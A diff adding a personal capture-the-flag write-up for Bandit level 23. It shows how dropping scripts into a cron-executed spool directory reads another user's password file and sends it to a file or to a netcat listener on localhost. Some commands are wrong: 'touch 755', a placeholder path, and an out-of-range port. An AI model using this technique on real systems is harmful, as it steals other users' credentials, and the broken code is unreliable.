@@ -1,0 +1,49 @@
+Bandit23
+
+Another cron job, but this time the timing of the script is important. Reading the contents of cronjob_bandit24 in /etc/cron.d we see that the script, 
+/usr/bin/cronjob_bandit24.sh, is ran at reboot and at every minute. 
+
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh  #<-- at reboot
+***** bandit24 /usr/bin/cronjob_bandit24.sh    #<-- every minute
+
+We can also see that cronjob_bandit24.sh will execute every script in /var/spool/bandit24 and then delete them all. That will be our attack vector. Upload a script to 
+that directory that will read the password and write it somewhere that we can see it. There are two ways that I see to do that; one way will write to a file, and the 
+other will write to a netcat server that we set up. First lets make a temporary folder to write scripts to and make sure that others users can read and write it.
+
+WORKD=$(mktemp -d)
+chmod 777 $WORKD
+
+Now lets create our executable shell script
+
+touch 755 $WORKD/exploit
+
+***Way One:
+
+vim $WORKD/exploit
+'''
+#! /bin/bash
+
+cat /etc/bandit_pass/bandit24 >> temporary folder/result
+'''
+cp $WORKD/exploit /var/spool/bandit24/exploit
+
+Now sit back, kick your feet up and wait for the result file to show up!
+
+***Way Two:
+
+vim $WORKD/exploit2
+'''
+#! /bin/bash
+
+cat /etc/bandit_pass/bandit24 | nc localhost 202020
+'''
+Use tmux and start a netcat server
+
+nc -l -p 202020
+
+split-window
+
+cp $WORKD/exploit2 /var/spool/bandit24/exploit2
+
+Now that is a full days work. Lets get a fire going in the fireplace, brew some hot cocoa, and cuddle up around the terminal waiting for the password to show up on 
+screen.
